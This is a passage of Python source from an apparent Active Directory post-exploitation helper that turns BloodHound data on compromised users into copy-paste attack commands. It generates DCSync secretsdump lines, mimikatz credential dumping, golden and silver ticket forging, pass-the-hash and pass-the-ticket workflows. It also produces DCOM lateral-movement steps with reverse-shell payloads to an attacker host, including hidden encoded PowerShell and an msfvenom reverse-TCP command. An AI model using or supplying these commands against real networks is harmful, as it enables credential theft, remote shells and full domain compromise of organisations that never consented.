        print(f"  {c.MAGENTA}SERVICE ACCOUNT ACCESS (gMSA){c.RESET}")
        print(f"{'='*90}")
        print()

        for user in users_with_gmsa:
            print(f"  {c.BOLD}{user.name}{c.RESET}")
            print(f"    {c.DIM}Can read:{c.RESET} {c.MAGENTA}{', '.join(user.gmsa_access)}{c.RESET}")
            print()

    print(f"{c.DIM}Run: bloodtrail --pwned-user USER  to see detailed access for a user{c.RESET}")
    print()


def print_machines_ip_table(machines: List[Dict], use_colors: bool = True, dc_ip: str = None) -> None:
    """
    Print table of machines with their resolved IP addresses.

    Args:
        machines: List of dicts with 'name' and 'ip' keys
        use_colors: Enable ANSI colors
        dc_ip: Domain Controller IP to highlight with blood drip emoji
    """
    c = Colors if use_colors else _NoColors

    if not machines:
        print(f"{c.DIM}No machines found in BloodHound database.{c.RESET}")
        return

    resolved = sum(1 for m in machines if m["ip"])
    print(f"\n{c.BOLD}{'='*60}{c.RESET}")
    print(f"  {c.CYAN}MACHINES{c.RESET} ({resolved}/{len(machines)} resolved)")
    print(f"{'='*60}\n")

    # Calculate column widths
    max_name = max(len(m["name"]) for m in machines)
    max_ip = max(len(m["ip"] or "---") for m in machines)

    # Header
    print(f"  {c.BOLD}{'Machine':<{max_name}}  {'IP Address':<{max_ip}}{c.RESET}")
    print(f"  {'-' * max_name}  {'-' * max_ip}")

    # Rows
    for m in machines:
        ip_display = m["ip"] if m["ip"] else "---"
        is_dc = dc_ip and m["ip"] == dc_ip
        ip_color = c.RED if is_dc else (c.CYAN if m["ip"] else c.DIM)
        dc_marker = " 🩸" if is_dc else ""
        print(f"  {m['name']:<{max_name}}  {ip_color}{ip_display:<{max_ip}}{c.RESET}{dc_marker}")

    # Legend
    if dc_ip:
        print()
        print(f"  {c.DIM}🩸 = Domain Controller (stored DC IP){c.RESET}")
    print()


def print_cred_harvest_targets(
    targets: List[Dict],
    use_colors: bool = True
) -> None:
    """
    Print high-priority credential harvest targets.

    These are machines where pwned users have admin AND privileged users have sessions.

    Args:
        targets: List of dicts with pwned_user, target, privileged_sessions
        use_colors: Enable ANSI colors
    """
    from .command_mappings import CRED_TYPE_TEMPLATES, fill_pwned_command

    c = Colors if use_colors else _NoColors

    if not targets:
        print(f"{c.DIM}No high-priority credential harvest targets found.{c.RESET}")
        return

    print()
    print(f"{c.RED}{c.BOLD}{'='*70}{c.RESET}")
    print(f"  {c.RED}PRIORITY CREDENTIAL HARVEST TARGETS{c.RESET}")
    print(f"{c.RED}{'='*70}{c.RESET}")
    print()

    for t in targets[:10]:
        user = t["pwned_user"]
        target = t["target"]
        sessions = t["privileged_sessions"]
        cred_type = t.get("cred_type", "password")
        cred_value = t.get("cred_value", "<PASSWORD>")

        # Extract username/domain
        if "@" in user:
            username, domain = user.split("@")
        else:
            username, domain = user, ""

        print(f"  {c.BOLD}{target}{c.RESET}")
        print(f"    {c.DIM}Pwned user:{c.RESET} {user} ({cred_type})")
        print(f"    {c.YELLOW}High-value sessions:{c.RESET} {', '.join(sessions[:5])}")

        # Secretsdump command
        template = CRED_TYPE_TEMPLATES.get(cred_type, {}).get("secretsdump")
        if template:
            cmd = fill_pwned_command(
                template,
                username=username,
                domain=domain,
                target=target,
                cred_value=cred_value
            )
            print(f"    {c.GREEN}{cmd}{c.RESET}")
        print()

    if len(targets) > 10:
        print(f"  {c.DIM}... and {len(targets) - 10} more targets{c.RESET}")

    print()


def print_post_exploit_commands(
    user_name: str,
    access: List = None,  # List[MachineAccess]
    domain_level_access: str = None,
    cred_types: List[str] = None,
    cred_values: List[str] = None,
    dc_ip: str = None,
    domain_sid: str = None,
    lhost: str = None,
    lport: int = None,
    use_colors: bool = True,
) -> None:
    """
    Display mimikatz post-exploitation recommendations based on privilege level.

    Shows credential harvest order with copy-paste ready commands,
    educational tips for what to look for, and next steps after harvesting.

    Args:
        user_name: User UPN (USER@DOMAIN.COM)
        access: List of MachineAccess objects
        domain_level_access: 'domain-admin' if user has DA-level rights
        cred_types: List of credential types the user has
        cred_values: List of corresponding credential values
        dc_ip: Domain Controller IP address
        domain_sid: Domain SID for Golden/Silver ticket (e.g., S-1-5-21-...)
        use_colors: Enable ANSI colors
    """
    from .command_mappings import (
        get_post_exploit_commands,
        get_harvest_tips,
        get_arg_acquisition,
        CRED_TYPE_TEMPLATES,
        fill_pwned_command,
        infer_dc_hostname,
    )

    c = Colors if use_colors else _NoColors
    access = access or []
    cred_types = cred_types or ["password"]

    # Extract username and domain
    if "@" in user_name:
        username, domain = user_name.split("@")
    else:
        username = user_name
        domain = ""

    # Determine DC target
    dc_target = dc_ip or infer_dc_hostname(domain)

    # Group access by privilege level
    local_admin_targets = [a for a in access if a.privilege_level == "local-admin"]
    session_targets = [a for a in local_admin_targets if a.sessions]

    # Header
    print()
    print(f"{c.CYAN}{'═'*75}{c.RESET}")
    print(f"  {c.BOLD}POST-EXPLOITATION COMMANDS{c.RESET} ({c.YELLOW}{user_name}{c.RESET})")
    print(f"{c.CYAN}{'═'*75}{c.RESET}")

    # =========================================================================
    # STORED CREDENTIALS
    # =========================================================================
    if cred_types and cred_values:
        print()
        print(f"  {c.BOLD}STORED CREDENTIALS{c.RESET}")
        print(f"  {c.DIM}{'─'*70}{c.RESET}")
        for ctype, cval in zip(cred_types, cred_values):
            if cval and cval not in ("<PASSWORD>", "<HASH>", "<TICKET_PATH>"):
                # Format credential type nicely
                ctype_display = ctype.replace("-", " ").title()
                print(f"    {c.DIM}{ctype_display}:{c.RESET}  {c.GREEN}{cval}{c.RESET}")

    # =========================================================================
    # PRIVILEGE ESCALATION PHASE
    # =========================================================================
    if domain_level_access:
        print()
        print(f"  {c.BOLD}{c.CYAN}{'─'*70}")
        print(f"  PRIVILEGE ESCALATION")
        print(f"  {'─'*70}{c.RESET}")
        print()
        print(f"  {c.RED}{c.BOLD}DOMAIN ADMIN ACCESS{c.RESET} [DCSync] (Priority: 199)")
        print(f"  {c.DIM}{'─'*70}{c.RESET}")

        # DCSync - remote preferred
        da_commands = get_post_exploit_commands("domain-admin", "remote_preferred")
        print(f"\n  {c.CYAN}DCSync (remote - safer):{c.RESET}")

        for cmd_tuple in da_commands:
            # Tuples are (cmd_id, description, module, ...)
            description = cmd_tuple[1] if len(cmd_tuple) > 1 else ""

            # Use impacket secretsdump template
            template = "impacket-secretsdump -just-dc '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<DC_IP>"
            if cred_types and cred_types[0] == "ntlm-hash":
                template = "impacket-secretsdump -just-dc -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<DC_IP>"
            cmd = template.replace("<USERNAME>", username).replace("<DOMAIN>", domain.lower())
            cmd = cmd.replace("<DC_IP>", dc_target)
            cmd = cmd.replace("<CRED_VALUE>", "<PASSWORD>" if not cred_types or cred_types[0] == "password" else "<HASH>")
            print(f"    {c.GREEN}{cmd}{c.RESET}")
            print(f"    {c.DIM}→ {description}{c.RESET}")

        # Golden Ticket (after obtaining krbtgt hash)
        print(f"\n  {c.CYAN}Golden Ticket (after obtaining krbtgt hash):{c.RESET}")
        sid_value = domain_sid if domain_sid else "<SID>"
        print(f"    {c.GREEN}mimikatz.exe \"kerberos::golden /user:{username} /domain:{domain.lower()} /sid:{sid_value} /krbtgt:<KRBTGT_HASH> /ptt\"{c.RESET}")

        # Arg acquisition for Golden Ticket - only show missing args
        missing_args = ["<KRBTGT_HASH>"]
        if not domain_sid:
            missing_args.insert(0, "<SID>")
        _print_arg_acquisition(missing_args, c)

    # =========================================================================
    # ON-TARGET ACTIONS (Post-Landing)
    # =========================================================================
    if local_admin_targets:
        print()
        print(f"  {c.BOLD}{c.CYAN}{'─'*70}")
        print(f"  ON-TARGET ACTIONS")
        print(f"  {'─'*70}{c.RESET}")
        print()
        print(f"  {c.RED}{c.BOLD}CREDENTIAL HARVESTING{c.RESET} ({len(local_admin_targets)} machines with local admin)")
        print(f"  {c.DIM}{'─'*70}{c.RESET}")

        # Priority targets with sessions
        if session_targets:
            print()
            print(f"  {c.YELLOW}★ PRIORITY TARGETS (Privileged Sessions Detected) ★{c.RESET}")
            for target in session_targets[:5]:
                sessions_str = ", ".join(target.sessions[:3])
                print(f"    {c.BOLD}{target.computer}{c.RESET}: Sessions from {c.YELLOW}{sessions_str}{c.RESET}")
                print(f"      {c.DIM}→ Run sekurlsa::logonpasswords to harvest these credentials!{c.RESET}")

        # Credential harvest order
        print()
        print(f"  {c.CYAN}CREDENTIAL HARVEST ORDER:{c.RESET}")
        print()

        harvest_commands = get_post_exploit_commands("local-admin", "credential_harvest")

        # Table header
        print(f"    {'#':<3} {'Command (copy-paste ready)':<62} {'Priority':<8}")
        print(f"    {'─'*3} {'─'*62} {'─'*8}")

        for idx, cmd_tuple in enumerate(harvest_commands, 1):
            # Tuples are (cmd_id, description, module, priority)
            cmd_id = cmd_tuple[0]
            description = cmd_tuple[1]
            module = cmd_tuple[2] if len(cmd_tuple) > 2 else cmd_id
            priority = cmd_tuple[3] if len(cmd_tuple) > 3 else "medium"

            # Build one-liner mimikatz command using the module
            mimi_cmd = f'mimikatz.exe "privilege::debug" "{module}" "exit"'

            priority_color = c.RED if priority == "high" else (c.YELLOW if priority == "medium" else c.DIM)
            print(f"    {idx:<3} {c.GREEN}{mimi_cmd:<62}{c.RESET} {priority_color}{priority.upper():<8}{c.RESET}")

        # Educational tips for harvest techniques
        _print_harvest_tips("sekurlsa::logonpasswords", c)
        _print_harvest_tips("sekurlsa::tickets", c)
        _print_harvest_tips("lsadump::sam", c)
        _print_harvest_tips("lsadump::secrets", c)

        # With harvested hash section
        print()
        print(f"  {c.CYAN}WITH HARVESTED NTLM HASH:{c.RESET}")
        print()

        # Overpass-the-Hash
        print(f"    {c.DIM}# Overpass-the-Hash (NTLM → Kerberos ticket):{c.RESET}")
        print(f"    {c.GREEN}mimikatz.exe \"sekurlsa::pth /user:{username} /domain:{domain.lower()} /ntlm:<HASH> /run:cmd.exe\"{c.RESET}")
        print()
        print(f"    {c.YELLOW}⚠ IMPORTANT: Use HOSTNAME not IP after Overpass-the-Hash!{c.RESET}")
        print(f"      {c.GREEN}✓ dir \\\\DC01\\C${c.RESET}  {c.DIM}(Kerberos - uses ticket){c.RESET}")
        print(f"      {c.RED}✗ dir \\\\10.0.0.1\\C${c.RESET}  {c.DIM}(NTLM - bypasses ticket!){c.RESET}")

        # Silver Ticket
        print()
        print(f"    {c.DIM}# Silver Ticket (requires service account hash):{c.RESET}")
        first_target = local_admin_targets[0].computer if local_admin_targets else "TARGET.DOMAIN.COM"
        sid_value = domain_sid if domain_sid else "<SID>"
        print(f"    {c.GREEN}mimikatz.exe \"kerberos::golden /domain:{domain.lower()} /sid:{sid_value} /target:{first_target.lower()} /service:cifs /rc4:<SERVICE_HASH> /user:{username} /ptt\"{c.RESET}")

        # Arg acquisition for Silver Ticket - only show missing args
        missing_args = ["<SERVICE_HASH>", "<TARGET_SPN>"]
        if not domain_sid:
            missing_args.insert(0, "<SID>")
        _print_arg_acquisition(missing_args, c)

        # Pass-the-Ticket workflow
        target_hostnames = [t.computer for t in local_admin_targets[:3]]
        ptt_console, _ = _generate_ptt_workflow(target_hostnames, domain, c)
        for line in ptt_console:
            print(line)

        # DCOM lateral movement workflow
        target_ips = [t.ip if hasattr(t, 'ip') and t.ip else t.computer for t in local_admin_targets[:3]]
        dcom_console, _ = _generate_dcom_workflow(target_ips, c, lhost=lhost, lport=lport)
        for line in dcom_console:
            print(line)

    # =========================================================================
    # NO PRIVILEGED ACCESS
    # =========================================================================
    if not local_admin_targets and not domain_level_access:
        print()
        print(f"  {c.DIM}No local-admin or domain-admin access detected.{c.RESET}")
        print(f"  {c.DIM}Post-exploitation commands require elevated privileges.{c.RESET}")

        # Show limited options for user-level access
        user_commands = get_post_exploit_commands("user-level", "limited")
        if user_commands:
            print()
            print(f"  {c.CYAN}LIMITED OPTIONS (User-Level):{c.RESET}")
            for cmd_tuple in user_commands:
                # Tuples are (cmd_id, description, module, ...)
                description = cmd_tuple[1] if len(cmd_tuple) > 1 else ""
                module = cmd_tuple[2] if len(cmd_tuple) > 2 else cmd_tuple[0]
                print(f"    {c.GREEN}mimikatz.exe \"{module}\"{c.RESET}")
                print(f"    {c.DIM}→ {description}{c.RESET}")

    print()
    print(f"{c.CYAN}{'═'*75}{c.RESET}")


def _print_harvest_tips(technique: str, c) -> None:
    """Print educational tips for a specific harvest technique."""
    from .command_mappings import get_harvest_tips

    tips = get_harvest_tips(technique)

    if not tips.get("what_to_look_for") and not tips.get("next_steps"):
        return

    print()
    print(f"    {c.DIM}┌─ {technique} ────────────────────────────────────────────────────┐{c.RESET}")

    if tips.get("what_to_look_for"):
        print(f"    {c.DIM}│{c.RESET} {c.BOLD}WHAT TO LOOK FOR:{c.RESET}")
        for item in tips["what_to_look_for"][:4]:
            print(f"    {c.DIM}│{c.RESET}   • {item}")

    if tips.get("next_steps"):
        print(f"    {c.DIM}│{c.RESET}")
        print(f"    {c.DIM}│{c.RESET} {c.BOLD}NEXT STEPS:{c.RESET}")
        for item in tips["next_steps"][:4]:
            print(f"    {c.DIM}│{c.RESET}   • {c.GREEN}{item}{c.RESET}")

    print(f"    {c.DIM}└───────────────────────────────────────────────────────────────────┘{c.RESET}")


def _print_arg_acquisition(placeholders: List[str], c) -> None:
    """Print arg acquisition hints for critical placeholders."""
    from .command_mappings import get_arg_acquisition

    print()
    print(f"    {c.DIM}┌─ ARG ACQUISITION ─────────────────────────────────────────────────┐{c.RESET}")

    for ph in placeholders:
        arg_info = get_arg_acquisition(ph)
        if not arg_info:
            continue

        print(f"    {c.DIM}│{c.RESET} {c.BOLD}{ph}{c.RESET} - {arg_info.get('description', '')}")

        quick_cmds = arg_info.get("quick_commands", [])
        for cmd in quick_cmds[:2]:
            print(f"    {c.DIM}│{c.RESET}   → {c.GREEN}{cmd}{c.RESET}")

        if arg_info.get("requires"):
            print(f"    {c.DIM}│{c.RESET}   {c.YELLOW}Requires: {arg_info['requires']}{c.RESET}")

        if arg_info.get("example"):
            print(f"    {c.DIM}│{c.RESET}   {c.DIM}Example: {arg_info['example']}{c.RESET}")

        print(f"    {c.DIM}│{c.RESET}")

    print(f"    {c.DIM}└───────────────────────────────────────────────────────────────────┘{c.RESET}")


def _generate_ptt_workflow(targets: List[str], domain: str, c) -> tuple:
    """
    Generate Pass-the-Ticket workflow section.

    Args:
        targets: List of target hostnames the user has access to
        domain: Domain name (e.g., 'corp.com')
        c: Colors class

    Returns:
        Tuple of (console_lines: list, markdown_lines: list)
    """
    from .command_mappings import PTT_WORKFLOW

    console_lines = []
    markdown_lines = []

    # Use first target for examples
    target = targets[0].split('.')[0] if targets else "TARGET"
    fqdn = f"{target}.{domain.lower()}" if domain else f"{target}.domain.com"

    # Header
    console_lines.append("")
    console_lines.append(f"  {c.CYAN}{c.BOLD}PASS-THE-TICKET WORKFLOW{c.RESET}")
    console_lines.append(f"  {c.DIM}{'─'*66}{c.RESET}")

    markdown_lines.append("#### Pass-the-Ticket Workflow")
    markdown_lines.append("")

    # Step 1: Export
    export = PTT_WORKFLOW["export"]
    console_lines.append(f"\n  {c.BOLD}{export['title']}{c.RESET}")
    console_lines.append(f"    {c.GREEN}{export['command']}{c.RESET}")
    for note in export["notes"]:
        console_lines.append(f"    {c.DIM}→ {note}{c.RESET}")

    markdown_lines.append(f"**{export['title']}**")
    markdown_lines.append(f"```")
    markdown_lines.append(export['command'])
    markdown_lines.append(f"```")
    markdown_lines.append("- " + "\n- ".join(export["notes"]))
    markdown_lines.append("")

    # Step 2: Identify
    identify = PTT_WORKFLOW["identify"]
    console_lines.append(f"\n  {c.BOLD}{identify['title']}{c.RESET}")
    for pattern, desc, priority in identify["priority_order"]:
        prio_color = c.RED if priority == "HIGHEST" else (c.YELLOW if priority == "HIGH" else c.DIM)
        console_lines.append(f"    {prio_color}[{priority}]{c.RESET} {pattern} - {desc}")

    markdown_lines.append(f"**{identify['title']}**")
    markdown_lines.append("| Priority | Pattern | Description |")
    markdown_lines.append("|----------|---------|-------------|")
    for pattern, desc, priority in identify["priority_order"]:
        markdown_lines.append(f"| {priority} | `{pattern}` | {desc} |")
    markdown_lines.append("")

    # Step 3a: Import Windows
    imp_win = PTT_WORKFLOW["import_windows"]
    console_lines.append(f"\n  {c.BOLD}{imp_win['title']}{c.RESET}")
    for label, cmd in imp_win["commands"]:
        console_lines.append(f"    {c.DIM}{label}:{c.RESET} {c.GREEN}{cmd}{c.RESET}")

    markdown_lines.append(f"**{imp_win['title']}**")
    markdown_lines.append("```")
    for label, cmd in imp_win["commands"]:
        markdown_lines.append(f"# {label}")
        markdown_lines.append(cmd)
    markdown_lines.append("```")
    markdown_lines.append("")

    # Step 3b: Import Linux
    imp_lin = PTT_WORKFLOW["import_linux"]
    console_lines.append(f"\n  {c.BOLD}{imp_lin['title']}{c.RESET}")
    for label, cmd in imp_lin["commands"]:
        console_lines.append(f"    {c.DIM}{label}:{c.RESET} {c.GREEN}{cmd}{c.RESET}")

    markdown_lines.append(f"**{imp_lin['title']}**")
    markdown_lines.append("```bash")
    for label, cmd in imp_lin["commands"]:
        markdown_lines.append(f"# {label}")
        markdown_lines.append(cmd)
    markdown_lines.append("```")
    markdown_lines.append("")

    # Step 4: Use the ticket
    cap = PTT_WORKFLOW["capitalize"]
    console_lines.append(f"\n  {c.BOLD}{cap['title']}{c.RESET}")
    console_lines.append(f"    {c.RED}{c.BOLD}⚠️ {cap['critical_warning']}{c.RESET}")
    console_lines.append(f"\n    {c.CYAN}Windows:{c.RESET}")
    for label, cmd in cap["windows_commands"]:
        filled_cmd = cmd.replace("<TARGET>", target)
        console_lines.append(f"      {c.DIM}{label}:{c.RESET} {c.GREEN}{filled_cmd}{c.RESET}")
    console_lines.append(f"\n    {c.CYAN}Kali:{c.RESET}")
    for label, cmd in cap["linux_commands"]:
        filled_cmd = cmd.replace("<TARGET>", target).replace("<USER>", "user")
        console_lines.append(f"      {c.DIM}{label}:{c.RESET} {c.GREEN}{filled_cmd}{c.RESET}")

    console_lines.append(f"\n    {c.GREEN}✓ {cap['examples']['correct']}{c.RESET}")
    console_lines.append(f"    {c.RED}✗ {cap['examples']['wrong']}{c.RESET}")

    markdown_lines.append(f"**{cap['title']}**")
    markdown_lines.append(f"> ⚠️ **{cap['critical_warning']}**")
    markdown_lines.append("")
    markdown_lines.append("**Windows:**")
    markdown_lines.append("```cmd")
    for label, cmd in cap["windows_commands"]:
        filled_cmd = cmd.replace("<TARGET>", target)
        markdown_lines.append(f"{filled_cmd}")
    markdown_lines.append("```")
    markdown_lines.append("")
    markdown_lines.append("**Kali:**")
    markdown_lines.append("```bash")
    for label, cmd in cap["linux_commands"]:
        filled_cmd = cmd.replace("<TARGET>", target).replace("<USER>", "user")
        markdown_lines.append(f"{filled_cmd}")
    markdown_lines.append("```")
    markdown_lines.append("")

    # Step 5: Verify access changes
    console_lines.append(f"\n  {c.BOLD}5. VERIFY ACCESS CHANGES{c.RESET}")
    console_lines.append(f"    {c.DIM}Compare share access before/after PTT to confirm privilege escalation:{c.RESET}")
    console_lines.append(f"    {c.GREEN}crackmapexec smb {fqdn} -u <USER> -p '<PASS>' --shares{c.RESET}")
    console_lines.append(f"    {c.GREEN}crackmapexec smb {fqdn} -k --shares{c.RESET}  {c.DIM}# With Kerberos ticket{c.RESET}")

    markdown_lines.append("**5. VERIFY ACCESS CHANGES**")
    markdown_lines.append("")
    markdown_lines.append("Compare share access before/after PTT to confirm privilege escalation:")
    markdown_lines.append("```bash")
    markdown_lines.append(f"# Before PTT (with password)")
    markdown_lines.append(f"crackmapexec smb {fqdn} -u <USER> -p '<PASS>' --shares")
    markdown_lines.append(f"")
    markdown_lines.append(f"# After PTT (with Kerberos ticket)")
    markdown_lines.append(f"crackmapexec smb {fqdn} -k --shares")
    markdown_lines.append("```")
    markdown_lines.append("")

    # Step 6: Troubleshooting
    trouble = PTT_WORKFLOW["troubleshoot"]
    console_lines.append(f"\n  {c.BOLD}6. TROUBLESHOOTING{c.RESET}")
    for issue in trouble["issues"]:
        console_lines.append(f"    {c.YELLOW}• {issue['problem']}{c.RESET}")
        console_lines.append(f"      {c.DIM}Fix: {issue['fix']}{c.RESET}")

    markdown_lines.append("**6. TROUBLESHOOTING**")
    markdown_lines.append("")
    for issue in trouble["issues"]:
        markdown_lines.append(f"- **{issue['problem']}**")
        markdown_lines.append(f"  - Fix: {issue['fix']}")
    markdown_lines.append("")

    return console_lines, markdown_lines


def _generate_dcom_workflow(targets: List[str], c, lhost: str = None, lport: int = None) -> tuple:
    """
    Generate DCOM lateral movement workflow section with auto-generated payloads.

    Args:
        targets: List of target hostnames/IPs the user has access to
        c: Colors class
        lhost: Attacker IP for reverse shell (None = show placeholders)
        lport: Attacker port for reverse shell (None = show placeholders)

    Returns:
        Tuple of (console_lines: list, markdown_lines: list)
    """
    from .payload_generator import PayloadGenerator

    console_lines = []
    markdown_lines = []

    # Use first target for examples
    target = targets[0] if targets else "<TARGET>"

    # Create payload generator
    gen = PayloadGenerator(lhost=lhost, lport=lport)

    # Header with target
    header_suffix = f" -> {target}" if target != "<TARGET>" else ""
    console_lines.append("")
    console_lines.append(f"  {c.CYAN}{c.BOLD}DCOM LATERAL MOVEMENT (Fileless){header_suffix}{c.RESET}")
    console_lines.append(f"  {c.DIM}{'─'*66}{c.RESET}")

    markdown_lines.append(f"#### DCOM Lateral Movement (Fileless){header_suffix}")
    markdown_lines.append("")

    if gen.is_configured:
        # === CONFIGURED: Show ready-to-use payloads ===

        # Step 0: Start listener
        console_lines.append(f"\n  {c.BOLD}0. START LISTENER{c.RESET}")
        console_lines.append(f"    {c.GREEN}{gen.get_listener_command()}{c.RESET}")

        markdown_lines.append("**0. START LISTENER**")
        markdown_lines.append("```bash")
        markdown_lines.append(gen.get_listener_command())
        markdown_lines.append("```")
        markdown_lines.append("")

        # Step 1: Instantiate DCOM object
        instantiate_cmd = gen.get_dcom_instantiate(target)
        console_lines.append(f"\n  {c.BOLD}1. INSTANTIATE DCOM OBJECT (run from compromised Windows){c.RESET}")
        console_lines.append(f"    {c.GREEN}{instantiate_cmd}{c.RESET}")

        markdown_lines.append("**1. INSTANTIATE DCOM OBJECT** (run from compromised Windows)")
        markdown_lines.append("```powershell")
        markdown_lines.append(instantiate_cmd)
        markdown_lines.append("```")
        markdown_lines.append("")

        # Step 2: Execute (choose payload)
        console_lines.append(f"\n  {c.BOLD}2. EXECUTE SHELL (choose one){c.RESET}")
        markdown_lines.append("**2. EXECUTE SHELL** (choose one)")
        markdown_lines.append("")

        payloads = gen.get_all_payloads(target)
        labels = ["A", "B", "C", "D"]
        for i, payload in enumerate(payloads):
            label = labels[i] if i < len(labels) else str(i + 1)
            console_lines.append(f"\n    {c.CYAN}[{label}] {payload.name}{c.RESET} {c.DIM}({payload.description}){c.RESET}")
            console_lines.append(f"    {c.GREEN}{payload.dcom_command}{c.RESET}")
            # Show full unencoded payload for reference
            console_lines.append(f"    {c.DIM}# Unencoded:{c.RESET}")
            console_lines.append(f"    {c.DIM}{payload.payload_raw}{c.RESET}")

            markdown_lines.append(f"**[{label}] {payload.name}** ({payload.description})")
            markdown_lines.append("```powershell")
            markdown_lines.append(payload.dcom_command)
            markdown_lines.append("```")
            markdown_lines.append(f"<details><summary>Unencoded payload</summary>")
            markdown_lines.append("")
            markdown_lines.append("```powershell")
            markdown_lines.append(payload.payload_raw)
            markdown_lines.append("```")
            markdown_lines.append("</details>")
            markdown_lines.append("")

        # Troubleshooting
        console_lines.append(f"\n  {c.BOLD}TROUBLESHOOTING{c.RESET}")
        console_lines.append(f"    {c.YELLOW}• Access denied / RPC unavailable{c.RESET}")
        console_lines.append(f"      {c.DIM}Verify local admin, check port 135{c.RESET}")
        console_lines.append(f"    {c.YELLOW}• Command runs but no shell{c.RESET}")
        console_lines.append(f"      {c.DIM}Check firewall, verify listener running{c.RESET}")

        markdown_lines.append("**TROUBLESHOOTING**")
        markdown_lines.append("- Access denied / RPC unavailable: Verify local admin, check port 135")
        markdown_lines.append("- Command runs but no shell: Check firewall, verify listener running")

    else:
        # === NOT CONFIGURED: Show placeholders with instructions ===

        console_lines.append(f"\n  {c.YELLOW}TIP: Run with --lhost YOUR_IP --lport 443 for ready-to-use payloads{c.RESET}")

        markdown_lines.append("> **TIP:** Run with `--lhost YOUR_IP --lport 443` for ready-to-use payloads")
        markdown_lines.append("")

        # Step 1: Instantiate
        instantiate_cmd = gen.get_dcom_instantiate(target)
        console_lines.append(f"\n  {c.BOLD}1. INSTANTIATE DCOM OBJECT{c.RESET}")
        console_lines.append(f"    {c.GREEN}{instantiate_cmd}{c.RESET}")

        markdown_lines.append("**1. INSTANTIATE DCOM OBJECT**")
        markdown_lines.append("```powershell")
        markdown_lines.append(instantiate_cmd)
        markdown_lines.append("```")
        markdown_lines.append("")

        # Step 2: Execute (manual)
        console_lines.append(f"\n  {c.BOLD}2. EXECUTE COMMAND{c.RESET}")
        console_lines.append(f"    {c.GREEN}$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e <BASE64_PAYLOAD>','7'){c.RESET}")
        console_lines.append(f"\n    {c.DIM}# Generate payload manually:{c.RESET}")
        console_lines.append(f"    {c.DIM}msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh -o shell.ps1{c.RESET}")

        markdown_lines.append("**2. EXECUTE COMMAND**")
        markdown_lines.append("```powershell")
        markdown_lines.append("$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e <BASE64_PAYLOAD>','7')")
        markdown_lines.append("```")
        markdown_lines.append("")
        markdown_lines.append("*Generate payload manually:*")
        markdown_lines.append("```bash")
        markdown_lines.append("msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh -o shell.ps1")
        markdown_lines.append("```")

    markdown_lines.append("")
    return console_lines, markdown_lines


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def _truncate(s: str, max_len: int) -> str:
    """Truncate string with '..' indicator"""
    if len(s) > max_len:
        return s[:max_len-2] + ".."
    return s


class _NoColors:
    """Dummy colors class for non-colored output"""
    HEADER = ''
    BLUE = ''
    CYAN = ''
    GREEN = ''
    YELLOW = ''
    RED = ''
    BOLD = ''
    DIM = ''
    RESET = ''


# =============================================================================
# PWNED USER ATTACK PATHS (for run_all_queries report)
# =============================================================================

def generate_pwned_attack_paths(driver, use_colors: bool = True) -> tuple:
    """
    Generate Pwned User Attack Paths section for the report.

    Queries Neo4j for pwned users and their access paths, generates
    credential-type-aware commands based on each user's specific privileges.
    Shows ALL available techniques per target for easy copy-paste.

    Args:
        driver: Neo4j driver instance
        use_colors: Enable ANSI colors for console output

    Returns:
        Tuple of (console_output: str, markdown_output: str)
        Returns ("", "") if no pwned users
    """
    from .command_mappings import (
        CRED_TYPE_TEMPLATES,
        LATERAL_TECHNIQUES,
        fill_pwned_command,
        infer_dc_hostname,
        get_techniques_for_access,
    )

    c = Colors if use_colors else _NoColors

    # 1. Fetch all pwned users with credentials
    pwned_users = _fetch_pwned_users(driver)
    if not pwned_users:
        return "", ""

    console_lines = []
    markdown_lines = []

    # Header
    console_lines.append("")
    console_lines.append(f"{c.CYAN}{c.BOLD}╔══════════════════════════════════════════════════════════════════════╗{c.RESET}")
    console_lines.append(f"{c.CYAN}{c.BOLD}║{c.RESET}   {c.YELLOW}🎯{c.RESET} {c.BOLD}Pwned User Attack Paths{c.RESET}                                      {c.CYAN}{c.BOLD}║{c.RESET}")
    console_lines.append(f"{c.CYAN}{c.BOLD}╚══════════════════════════════════════════════════════════════════════╝{c.RESET}")
    console_lines.append("")

    markdown_lines.append("## 🎯 Pwned User Attack Paths")
    markdown_lines.append("")

    for user in pwned_users:
        user_name = user["name"]
        cred_type = user.get("cred_type", "password")
        cred_value = user.get("cred_value", "")

        # Extract username and domain from UPN
        if "@" in user_name:
            username, domain = user_name.split("@")
        else:
            username = user_name
            domain = ""

        # 2. Fetch access paths for this user
        access_by_priv = _fetch_user_access(driver, user_name)

        # 3. Check domain-level access
        domain_access = _check_domain_access(driver, user_name)

        # User header
        console_lines.append(f"{c.BOLD}{c.CYAN}{'═'*70}{c.RESET}")
        console_lines.append(f"{c.BOLD}{user_name}{c.RESET}")
        console_lines.append(f"{c.DIM}Credential:{c.RESET} {c.YELLOW}{cred_type}{c.RESET}")
        console_lines.append(f"{c.CYAN}{'─'*70}{c.RESET}")

        markdown_lines.append(f"### {user_name}")
        markdown_lines.append(f"**Credential:** {cred_type}")
        markdown_lines.append("")

        # Domain-level access (DCSync / DomainAdmin)
        if domain_access in ("DCSync", "DomainAdmin", "GenericAll"):
            console_lines.append("")
            access_label = "DOMAIN ADMIN" if domain_access == "DomainAdmin" else domain_access
            console_lines.append(f"👑 {c.RED}{c.BOLD}DOMAIN ADMIN ACCESS{c.RESET} [{access_label}]")
            console_lines.append("")
            console_lines.append(f"  {'Attack':<22} {'Reason':<40} {'Ready Command'}")
            console_lines.append(f"  {'-'*22} {'-'*40} {'-'*60}")

            template = CRED_TYPE_TEMPLATES.get(cred_type, {}).get("DCSync")
            if template and cred_value:
                cmd = fill_pwned_command(template, username, domain, infer_dc_hostname(domain), cred_value)
                reason = "Member of Domain Admins" if domain_access == "DomainAdmin" else "GetChanges+GetChangesAll"
                console_lines.append(
                    f"  {c.BOLD}{'DCSync':<22}{c.RESET} "
                    f"{c.YELLOW}{_truncate(reason, 38):<40}{c.RESET} "
                    f"{c.GREEN}{cmd}{c.RESET}"
                )

            markdown_lines.append(f"#### DCSync - Dump Domain Credentials ⚡")
            markdown_lines.append(f"| Attack | Reason | Command |")
            markdown_lines.append(f"|--------|--------|---------|")
